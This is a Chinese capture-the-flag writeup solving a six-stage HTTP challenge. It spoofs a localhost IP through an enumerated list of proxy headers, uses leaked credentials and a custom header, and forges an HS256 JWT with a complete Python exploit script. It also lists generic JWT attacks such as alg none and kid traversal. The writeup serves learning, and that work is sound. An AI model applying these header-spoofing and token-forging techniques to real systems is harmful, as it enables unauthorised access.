# 极客大挑战2024 · ez_http（六级链）Writeup

| 项 | 内容 |
|---|---|
| 平台 | 极客大挑战 2024（SYC 招新赛）· ctfplus 动态靶机 |
| 题目 | **ez_http** —— 六级链 HTTP 头综合题（L1~L6 串行） |
| 考点 | GET/POST 参数 → `Referer` → **IP 头枚举** → 自定义头 → **JWT HS256 伪造（改 hasFlag + 重签）** |
| flag | `SYC{b06d1f4d-2a07-4226-868f-43afbe6f3a5e}`（**该实例的**；ctfplus 每个实例随机生成，换实例必变） |
| 状态 | 已通关（原始记录：[logs/2026-10-04.md](../../logs/2026-10-04.md)） |
| 一句话 | 六项条件必须**一次全带**，任何一项缺失都停在那一关的报错上 |

> 相关笔记：[notes/13 · 代理 IP 头 XFF 与 X-Real-IP](../../notes/13-代理IP头XFF与X-Real-IP.md)（L4 的另一视角）

## 一句话

> 题目把一个请求**从外到内切成六层**——URL 参数、POST 表单、`Referer`、客户端 IP、自定义头、Cookie 里的 JWT——**必须一次全部满足**；其中 L2 凭据由报错白送、L5 的头名由源码回显白送、L4 靠**枚举 IP 头**试出来，最后一关要改 JWT 的 `hasFlag` 并在**字节层面**改 `hasFlag` 后**重新签名**。

## 一、关卡地图

| 关卡 | 要求 | 位置 | 怎么拿到的 |
|---|---|---|---|
| **L1** | `welcome=geekchallenge2024` | GET 参数 | 题面/首页直给 |
| **L2** | `username=Starven` & `password=qwert123456` | POST body | **报错直接泄露凭据** |
| **L3** | `Referer: https://www.sycsec.com` | 请求头 | 报错提示 |
| **L4** | **`X-Real-IP: 127.0.0.1`** | 请求头 | **枚举 IP 头试出来的**（XFF 无效） |
| **L5** | **`Starven: I_Want_Flag`** | 请求头 | L3 通过后**响应打印出 L5 的 PHP 源码** |
| **L6** | JWT：改 `hasFlag` 为 `true` 并重签 | Cookie | 分析 JWT + 泄露出密钥 |

### 串行 AND：六项必须一次全带

服务端是**逐关判断、遇错即停**的结构：第 N 关不通过就 `die()`，永远不会走到 N+1。

```
带 1 项       → 卡 L2
带 2 项       → 卡 L3
带 3 项       → 卡 L4
带 4 项       → 卡 L5      ← 注意：Cookie 出错也表现为卡 L5
带 5 项       → 卡 L6
带 6 项       → flag
```

**实测证据**：只加 `X-Real-IP` 却停在 L3 —— 因为 `Referer` 忘了带（前四关条件必须一起带）。

## 二、逐关突破

### L1 · `welcome` 参数（GET）

**要什么**：`welcome=geekchallenge2024`。

**怎么发现**：题面给的值，直接放 URL 上。位置是 **GET 参数**，不是 POST body。

**注意**：参数名**区分大小写** —— `welcome` PASS，`Welcome` 卡 **L1**。

### L2 · 登录凭据（POST body）

**要什么**：`username=Starven`、`password=qwert123456`。

**怎么发现**：**报错直接给**。L1 通过后直接返回明文提示：

```
nonono, username=Starven , password=qwert123456
```

**注意**：三个都敏感 —— 参数名 `UserName` 卡 L2，值 `starven` 也卡 L2。

### L3 · `Referer` 头

**要什么**：`Referer: https://www.sycsec.com`。

**怎么发现**：报错提示里要求从 sycsec 站点跳转过来。注意 `https`、`www` **全小写**，写错就卡 L3。

**这一关的额外价值**：通过之后，响应里**打印出了 L5 的 PHP 源码** —— 相当于白送下一关的答案。

### L4 · 伪造「本地 IP」（请求头）

**要什么**：让服务端认为请求来自本地。

**怎么发现**：**枚举试出来的**。这是本题唯一需要"暴力枚举头名"的一关：

| 尝试 | 响应 |
|---|---|
| `X-Forwarded-For: 127.0.0.1` | `nonono,you're not from local ip` |
| **`X-Real-IP: 127.0.0.1`** | **过关** |

**结论**：出题人代码**只读 `$_SERVER["HTTP_X_REAL_IP"]`**，写 XFF 完全没用。

**IP 头全枚举清单**（一次性全带上最省事）：

```
X-Forwarded-For: 127.0.0.1      X-Real-IP: 127.0.0.1
Client-IP: 127.0.0.1            X-Client-IP: 127.0.0.1
Remote-Addr: 127.0.0.1          X-Remote-Addr: 127.0.0.1
X-Originating-IP: 127.0.0.1     Forwarded: for=127.0.0.1
True-Client-IP: 127.0.0.1       X-Remote-IP: 127.0.0.1
```

值也要试：`127.0.0.1` / `localhost` / `::1` / `0.0.0.0` / `192.168.*` / `10.*`。

**为什么出题人选 `X-Real-IP` 而不是 XFF**：它是**单值**，`$_SERVER['HTTP_X_REAL_IP'] == '127.0.0.1'` 一行就够；XFF 是**列表**，取值要 `explode` + `trim` 还得考虑取第几段 —— 出题人懒得写。

**判定是否命中**：看响应里出现的最高的 `LevelN`。`maxLevel 从 4 → 5` 就是命中。

### L5 · 自定义头 `Starven`（请求头）

**要什么**：`Starven: I_Want_Flag`。

**怎么发现**：L3 通过后响应**回显 PHP 源码**，从源码里读出：

```php
$_SERVER['HTTP_STARVEN']      // ← 要发的头名反推出来了
```

**PHP 头名 → `$_SERVER` 键的映射规则**（看到源码就能反推该发什么头）：

| 请求头发的是 | PHP 里的键 |
|---|---|
| `Starven: I_Want_Flag` | `$_SERVER['HTTP_STARVEN']` |
| `X-Real-IP: 127.0.0.1` | `$_SERVER['HTTP_X_REAL_IP']` |
| `Referer: https://...` | `$_SERVER['HTTP_REFERER']` |
| `User-Agent: curl` | `$_SERVER['HTTP_USER_AGENT']` |
| `Content-Type: ...` | `$_SERVER['CONTENT_TYPE']` **无 `HTTP_` 前缀** |
| `Content-Length: ...` | `$_SERVER['CONTENT_LENGTH']` **无 `HTTP_` 前缀** |

三个变换：**① 转大写 → ② `-` 换成 `_` → ③ 加 `HTTP_` 前缀**。
> 唯二的例外是 `Content-Type` / `Content-Length`，其余自定义头一律 `HTTP_` + 大写 + 下划线。

**实测：头名大小写不敏感，但头值敏感**（用**原始 socket** 逐字发送；`urllib` / `http.client` 会规范化头名，测不出来）：

| 层 | 区分大小写？ | 证据 |
|---|---|---|
| **HTTP 头名** | **不区分** | `Starven` / `starven` / `STARVEN` / `sTaRvEn` → **全部 PASS** |
| HTTP 头值 | 区分 | `I_Want_Flag` 精确；`i_want_flag` / `I_WANT_FLAG` 全挂 |
| **Cookie 名** | 区分 | `token` PASS；`Token` / `TOKEN` 全挂 |
| **GET 参数名** | 区分 | `welcome` PASS；`Welcome` 卡 L1 |
| **POST 参数名** | 区分 | `username`/`password` PASS；`UserName` 卡 L2 |
| **JWT 字段名** | 区分 | `hasFlag` PASS；`HasFlag` / `hasflag` 全挂 |

**根因**：头名不敏感是 **RFC 7230 规定**的（Apache 规范化后再映射成 `$_SERVER` 键）；参数名/字段名敏感是因为 **PHP 数组键 / JSON 对象键本身区分大小写**。

**位置比大小写更重要**：HackBar / Burp 里手写自定义头时，如果插件把 `Starven` 当普通键值处理（写进了 POST data 区），那它就不是 HTTP 头了，立刻失效。

### L6 · JWT 伪造（Cookie）

**要什么**：把 Cookie `token` 里 payload 的 `hasFlag` 改成 `true`，并让服务端接受。这是全题核心，单独成节 → 见 **三**。

## 三、核心：JWT 伪造

### 3.1 token 长什么样

```
base64url(header) . base64url(payload) . base64url(signature)
```

```json
header  = {"typ":"JWT","alg":"HS256"}
payload = {"iss":"Starven","aud":"Ctfer","iat":…,"nbf":…,"exp":…,
           "username":"Starven","password":"qwert123456","hasFlag":false}
```

密钥也从响应里泄露（`Starven_secret_key`），所以可以先生成一份**完全正确**的签名来对照。

### 3.2 签名对象是「base64 串」，不是 JSON

```python
signing_input = f"{header_b64}.{payload_b64}".encode()      # 是字符串，不是 JSON！
signature = b64url(HMAC-SHA256(key, signing_input))
```

三个必须记住的点：

1. **签名对象是原始 base64 串拼接的字符串** —— 不是 JSON 重新序列化
2. **payload 的字节必须原样保留** —— 用 `json.dumps()` 重新序列化会改变格式（如冒号后的空格），签名就对不上
3. **base64url 要去掉 `=` 填充**（`rstrip(b"=")`）；解码时要补回来（`s + "=" * (-len(s) % 4)`）

> 走过的弯路：因为 `json.dumps` 改了 payload 字节，误判成"密钥不对"。**根因是没有先把 token 解码打印出来看一眼。**

### 3.3 base64 分段：什么时候「长度变了」才会出事

> **先记结论：只要重新签名，长度随便变，完全不用管对齐。**
> 只有**手工在 base64 串里原地改字符**时，才需要关心长度。

| 明文 | base64url（去填充） | 长度 |
|---|---|---|
| `false` | `ZmFsc2U` | **7** |
| `true` | `dHJ1ZQ` | **6** |
| `false}` | `ZmFsc2V9` | **8** |
| `true}` | `dHJ1ZX0` | **7** |

**实测：四种做法哪种会死**（PHP 靶机环境）

| 做法 | b64 长度 | `json_decode` 结果 |
|---|---|---|
| 原样 | 192 | `hasFlag=false` |
| 原地替换 `ZmFsc2V9` → `dHJ1ZX0` | **191** | **`hasFlag=true`** |
| 解码 → 改字节 → 重编码（**不补空格**） | 191 | `hasFlag=true` |
| 解码 → 改字节 → 补空格等长 | 192 | `hasFlag=true` |
| **重签（正解）** | 任意 | **长度无关** |

**→ 四种做法都能解出 `hasFlag=true`** —— 因为这题的改动点在末尾。

**为什么不掉链子**：改动点在 payload **末尾**，`false}` 正好占最后 2 个完整分组；
砍掉 1 字节后末尾只剩一个**不完整分组**，PHP 的 `base64_decode` 会把它按 2 字节正常解出来 ——
前面所有分组**一个都没动**。

**那什么时候真会出事** —— 改动点在**中间**且长度变了，它后面的分组才会整体前移：

| 场景 | 会出事吗 |
|---|---|
| 改末尾（`false}` → `true}`） | 不会（实测全过） |
| 改中间 + 长度不变（`Ctfer` → `Hackr`） | 不会 |
| **改中间 + 长度变了**（`qwert123456` → `admin`） | **会** |
| 重新签名 | 不会，长度随便变 |

**所以正确做法只有一条**：

```python
raw = b64url_decode(payload_b64)          # ① 先解码成字节
raw = raw.replace(b"false", b"true", 1)   # ② 在字节层面改，不在 base64 层面改
p   = b64url_encode(raw)                  # ③ 重新编码
tok = f"{h}.{p}.{hs256_sign(h, p, key)}"  # ④ 重新签名 ← 长度从此与你无关
```

> **补空格（`b"true "`）只在「不重签、靠服务端不验签过关」时才需要** —— 那是绕过手法，不是解法。
> **同源现象**：前一天 seek flag 的"丢点"（token 里两个 `.` 消失），本质是**少一位导致分段错位** —— 同一类问题。

### 3.4 判定实验：服务端到底验不验签

> **这一节只是"诊断"，不是解法。**
> **本题一律用 §3.2 的重新签名（HS256 + 密钥）作为正式解法**，理由见下。

**为什么要先做这个判定**：**真验签的题里，"重新签名"是唯一的路**；先花一次请求判掉，
就能知道后面要不要死磕密钥。

```
改 payload 直接发一次
├─ 没过 → 老老实实重新签名（正解）
└─ 过了 → 说明服务端没验签，但这不代表可以省掉签名—— 见下方说明
```

本题实测结果：

| 送法 | 结果 |
|---|---|
| 改 payload，签名保留旧值 | PASS |
| 改 payload，**随机垃圾签名** | PASS |
| 改 payload，**签名段留空** | PASS |
| 改 payload，**只发两段（无签名）** | PASS |
| 改 payload，**发四段** | PASS |
| **签名完全正确，但 `hasFlag=false`** | **BLOCKED** |
| payload 里 `password` → `parsword` | **BLOCKED** |

**反推出的服务端逻辑**：

```php
$parts = explode('.', $cookie_token);
$payload = json_decode(base64_decode($parts[1]));
if ($payload->hasFlag == true && ...) { echo $flag; }
// $parts[2]（签名）从头到尾没被用过
```

### 为什么不把「改 payload 不重签」当解法

| 理由 | 说明 |
|---|---|
| **它依赖服务端的漏洞，不是通用手法** | 换个真验签的题立刻失效，学不到东西 |
| **它绕过了本题最值得学的点** | 本题的考点就是 **HS256 重签** |
| **真实环境里根本不成立** | 任何正常 JWT 库都会验签；靠"服务端没验签"过关等于没做 |
| **面试/复盘时说不出所以然** | "我改了 payload 没重签就过了" —— 这不是能力，是运气 |

**所以：本题的正式解法只有一条 —— 拿到密钥 → `jwt_forge()` 改字节 + 重新 HS256 签名。**
签名必须**正确**；只要重签，**长度不用管**。

### 3.5 编码方式：本题不影响，但仍要用标准 base64url

| 项目 | 结果 |
|---|---|
| header/payload/signature 三段各用 std / url / std-去填充 | **27 种组合全部 PASS** |
| 签名段填 `"A"*43` / 留空 / 加空格 | 全部 PASS |
| payload 段 `_`→`/`、`-`→`+`、末尾加 `=` | 全部 PASS |

**本题编码方式完全不影响结果** —— 服务端的 `base64_decode` 很宽容。

**但仍建议用标准 base64url**，理由不是"服务端要求"，而是**传输安全**：

```
+  → 在 URL/表单里会被解成空格
=  → 某些 Cookie 解析器会截断
```

真验签的题里，`+` 被吃成空格 → 签名校验必然失败。

### 3.6 JWT 结构容错矩阵（实测）

| 结构 | 结果 |
|---|---|
| 三段 `h.p.s` | PASS |
| **两段 `h.p`（无签名）** | PASS |
| **四段 `h.p.s.extra`** | PASS |
| 一段（**无点**） | BLOCKED ← 最常见的手抄事故 |

> **收到 token 第一件事：先数点。** `print(len(token.split(".")))` 必须是 3。

### 3.7 URL 编码层级：只能编一次

| 编码次数 | 结果 |
|---|---|
| 原样 | PASS |
| **编码 1 次** | PASS |
| **编码 2 次** | **BLOCKED** |

**原因：PHP 的 `$_COOKIE` 会自动 `urldecode` 一次。**

```
你发:        eyJ...%2EeyJpc3...   → PHP 解一次 → eyJ...eyJpc3...   点还原了
双重编码:    eyJ...%252EeyJpc3... → PHP 解一次 → eyJ...%2EeyJpc3... 还是 %2E
                                    explode('.') 只有 1 段 → 失败
```

> **你编一次，PHP 解一次，刚好抵消；编两次就多出一层。**

## 四、完整通关脚本

`jwt_forge` 是通用函数，可直接复用到所有 JWT 题。

```python
import base64, hashlib, hmac, json, re, requests

URL = "http://<host>/?welcome=geekchallenge2024"
FORM = {"username": "Starven", "password": "qwert123456"}
HEADERS = {"Referer": "https://www.sycsec.com",
           "X-Real-IP": "127.0.0.1",
           "Starven": "I_Want_Flag"}

# ---------- JWT 工具 ----------
def b64url_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))   # 补填充

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()   # 去填充

def hs256_sign(header_b64, payload_b64, key):
    signing_input = f"{header_b64}.{payload_b64}".encode()     # 字符串，不是 JSON
    return b64url_encode(hmac.new(key, signing_input, hashlib.sha256).digest())

def jwt_forge(token, key, old, new):
    """在 payload 原始字节上替换，再重新签名（长度随便变）"""
    header_b64, payload_b64, _ = token.split(".")
    raw = b64url_decode(payload_b64)
    if len(new) < len(old):                     # 等长对齐（补空格）
        new = new + b" " * (len(old) - len(new))
    new_raw = raw.replace(old, new, 1)
    new_payload_b64 = b64url_encode(new_raw)
    return f"{header_b64}.{new_payload_b64}.{hs256_sign(header_b64, new_payload_b64, key)}"

def jwt_doctor(token):
    """调试体检：段数 / 原始字节 / 字段名 / 有效期"""
    parts = token.split(".")
    print("段数:", len(parts), "(必须 3)")
    if len(parts) != 3: return
    h, p, s = parts
    raw = b64url_decode(p)
    print("payload 原始字节:", raw)
    print("payload 解析    :", json.dumps(json.loads(raw), ensure_ascii=False))
    print("含 +/-/= 的段   :", [c for c in "+/=" if any(c in x for x in parts)])
    obj = json.loads(raw)
    for k in ("password", "parsword"):                 # 字段名拼写检查
        if k in obj: print(f"字段名: {k}", "对" if k == "password" else "拼错了")
    if "exp" in obj:
        import time
        print("剩余有效: %.1f 分钟" % ((obj["exp"] - time.time()) / 60))

# ---------- 利用 ----------
resp = requests.post(URL, data=FORM, headers=HEADERS)
token = re.search(r"token\s*=\s*([\w\-]+\.[\w\-]+\.[\w\-]+)", resp.text).group(1)
key = re.search(r'key is "([^"]+)"', resp.text).group(1).encode()   # Starven_secret_key

jwt_doctor(token)                       # 先体检，再动手

# 先验签，确认密钥正确
h, p, s = token.split(".")
assert hs256_sign(h, p, key) == s, "密钥不对"

# 改 hasFlag 并重新签名
forged = jwt_forge(token, key, b"false", b"true")

r = requests.post(URL, data=FORM, headers=HEADERS, cookies={"token": forged})
print(re.search(r"flag:([^<\s]+)", r.text).group(1))
# → SYC{...}   ← 每个实例的 flag 都不同，别抄这个值，跑脚本就行
```

> **两个 `requests` 参数名别写错**：`cookies=`（复数，值是字典）、`res.text`（不是 `res.txt`）。
> **别用响应回显的那个 token**：服务端**每次响应都新发**一个 `hasFlag:false` 的 token，用自己改好的那个。

## 五、踩坑与教训

### 5.1 JWT 相关

| 问题 | 原因 | 解决 |
|---|---|---|
| **复算签名跟服务端不一致** | 用 `json.dumps()` 重新序列化，格式变了（多了冒号后的空格） | **payload 字节原样保留**，只替换目标字符 |
| **手工在 base64 串里改中间字段** | 改动点后面的分组整体错位 → JSON 解析失败 | **先 base64 解码成字节再改**，然后重编码 + 重签 |
| **token 里一个点都没有** | 服务端输出处换行，复制时把 `.` 一起吃掉了 | 脚本里正则抓取，**全程不落剪贴板** |
| **字段名 `parsword`（少个 s）** | 手抄/传递时丢字符 | 加体检 `assert "password" in payload` |
| **`base64.b64decode` 报 padding 错** | JWT 去掉了 `=` 填充 | `s + "=" * (-len(s) % 4)` |
| **双重 URL 编码后失效** | `$_COOKIE` 只解一次，`%252E` 解完还是 `%2E` | **只编一次**（或干脆不编） |
| **签名段有 `+` 和 `=`** | 被某个工具重新用标准 base64 编码了 | 转回 base64url；或直接用脚本新取 |
| **改了 cookie 还是没出 flag** | 前五关条件没一起带 | **六项条件必须同时满足** |

### 5.2 分层 / 请求相关

| 问题 | 原因 | 解决 |
|---|---|---|
| **只加 `X-Real-IP` 却停在 L3** | `Referer` 忘了带 | 前四关条件必须一起带 |
| **`X-Forwarded-For` 不管用** | 出题人只读 `$_SERVER['HTTP_X_REAL_IP']` | **枚举**所有 IP 头 |
| **`requests` 报 `unexpected keyword 'cookie'`** | 参数名是复数 | `cookies=`（报错信息里已提示 `Did you mean 'cookies'?`） |
| **响应里又出现一个 `hasFlag:false` 的 token** | 服务端**每次响应都新发**一个 token | 别用回显的，用自己改好的 |
| **用 Python 测头名大小写测不出来** | `urllib` / `http.client` 会规范化头名 | 用**原始 socket** 逐字发送 |

### 5.3 本日最大教训

> **JWT 不通过时，先数点（段数），再查编码，最后才怀疑签名。**
>
> 一开始纠结"要不要重签"，实际上服务端压根不验签；后来又因为 `json.dumps` 改变了 payload 字节而误判"密钥不对"。**根因都是没有先把 token 解码打印出来看一眼。**

## 六、可复用方法论

### 6.1 「卡在第几关」反推诊断法

分层题天然自带诊断工具 —— **报错停在哪一关，问题就在那一关**：

| 卡在 | 说明 |
|---|---|
| L1 | `welcome` 参数名或值有问题 |
| L2 | `username` / `password` 有问题 |
| L3 | `Referer` 缺失或值不对（注意 `https`、`www` 都小写） |
| L4 | `X-Real-IP` 缺失或值不对 |
| **L5** | `Starven` 头有问题，**或 Cookie 的 token 有问题** |

**最后一条最有用**：L5 是"最后一个会报错的关卡"，所以 **cookie 出错也表现为卡在 L5**。若确认头都带了却卡 L5，直接去查 token（丢点、字段名错、`hasFlag` 没改、过期）。

### 6.2 IP 头要枚举，不能只试 XFF

框架/出题人读哪个头是**不确定**的：本题 `XFF` 、`X-Real-IP` 。

- 全枚举清单见 **2.4 节**；一次性全带上最省事，注意有些框架取「第一个/最后一个」，可换顺序再试。
- 若全部无效 → 校验的是 **TCP 层 `REMOTE_ADDR`** → 只能靠 **SSRF** 让服务器自己发请求。
- 判定命中：看响应里出现的**最高 `LevelN`**。

### 6.3 拿到 token 先数点、先解码

```python
print(len(token.split(".")))                 # 必须是 3
print(json.dumps(json.loads(b64url_decode(p)), ensure_ascii=False))
```

**顺序**：段数 → 解码 → 字段名/有效期 → 编码 → 最后才怀疑签名。跳过前三步去猜签名，就是本日走过的弯路。

### 6.4 改 payload 只在字节层面改

**不要在 base64 字符串里原地替换** —— 改动点后面还有内容时，长度一变就会整体错位。

```python
raw = b64url_decode(payload_b64)          # ① 先解码成字节
raw = raw.replace(b"false", b"true", 1)   # ② 在字节层面改
p   = b64url_encode(raw)                  # ③ 重新编码
tok = f"{h}.{p}.{hs256_sign(h, p, key)}"  # ④ 重新签名 ← 长度从此与你无关
```

> **实测**：改末尾（`false}` → `true}`）时，补不补空格、长度变不变，**四种做法全都能过** ——
> 因为前面所有分组没被碰到。真正会死的是**改中间 + 长度变了**。
> 而只要**重新签名**，长度怎么变都无所谓。

同一规律在别处也成立：**丢点**（两个 `.` 消失）、**双重 URL 编码**、**序列化长度不更新** —— 本质都是"按固定宽度切分的结构少了一位"。

### 6.5 三条固定习惯

1. **拿到 token 先解码打印**
2. **payload 先 base64 解码成字节再改** —— 别在 base64 字符串里原地替换
3. **每步保留可验证中间量** —— 签名比对、字节长度、maxLevel

### 6.6 同一主体的多种送法（通用补充，本题未验证）

| 攻击面 | 送法 | 状态 |
|---|---|---|
| `alg: none` / 空签名绕过 | 把 header 改成 `{"alg":"none"}` 并清空签名段 | **通用补充，本题未验证**（本题签名段留空已 PASS，但走的是"不验签"，不是 `alg:none` 逻辑） |
| **RS256 → HS256 算法混淆** | 用公钥当 HMAC 密钥重签 | **通用补充，本题未验证** |
| `kid` 注入 / 路径穿越 | `kid` 指向 `/dev/null` 或可控文件 | **通用补充，本题未验证** |
| `jwk` / `jku` 头注入 | header 里塞自己的公钥地址 | **通用补充，本题未验证** |
| 弱密钥爆破 | `hashcat -m 16500` 跑字典 | **通用补充，本题未验证**（本题密钥由报错直接泄露，无需爆破） |

## 附录：一句话总结

> **六层请求条件串行 AND，必须一次全带；「卡在第几关」直接告诉你错在哪一层（Cookie 出错也卡 L5）。**
> **L4 的关键是枚举 IP 头 —— `XFF` 无效、`X-Real-IP` 有效。**
> **JWT 的签名对象是 base64 串而非 JSON；改 payload 要「base64 解码 → 改字节 → 重编码」三步走，不要在 base64 字符串里原地替换。**
> **正式解法只有一条：`jwt_forge()` —— 改字节 + 重新 HS256 签名（重签之后长度随便变）。**「改 payload 不重签」只是用来判断服务端验不验签的**诊断**，不算解法，换一道题就废。
